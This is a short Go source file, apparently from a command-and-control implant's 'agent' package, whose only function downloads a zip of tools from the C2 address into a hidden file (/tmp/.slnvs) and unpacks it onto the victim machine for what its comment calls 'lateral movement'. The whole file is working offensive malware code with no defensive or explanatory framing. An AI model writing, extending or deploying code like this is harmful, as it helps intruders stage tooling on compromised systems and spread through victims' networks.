package agent

/*
install tools to UtilsPath, for lateral movement
*/

import (
	"log"

	"github.com/mholt/archiver"
)

func installUtils() string {
	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
	err := Download(CCAddress+"utils.zip", "/tmp/.slnvs")
	out := "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
	}

	// TODO unpack utils.zip to our PATH
	if err = archiver.Unarchive("/tmp/.slnvs", UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
	}
	return out
}
